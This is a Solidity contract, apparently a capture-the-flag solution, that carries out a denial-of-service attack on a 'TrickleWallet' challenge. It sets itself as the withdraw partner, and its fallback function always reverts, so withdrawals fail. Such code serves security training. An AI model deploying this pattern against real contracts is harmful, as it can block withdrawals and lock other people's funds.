// SPDX-License-Identifier: MIT

/// @knowledgePoint Dos

/// @level 普通

pragma solidity ^0.4.24;

interface TrickleWallet {
    function setWithdrawPartner(address) external;

    function withdraw() external;
}

interface Check {
    function isCompleted() external;
}

contract Exploit {
    address public wallet;
    address public check;
    uint256 public count;

    constructor(address _wallet, address _check) public {
        wallet = _wallet;
        check = _check;
    }

    function exploit() public {
        TrickleWallet(wallet).setWithdrawPartner(address(this));
    }

    function complete() public {
        Check(check).isCompleted();
    }

    function() payable {
        require(1 == 2);
    }
}
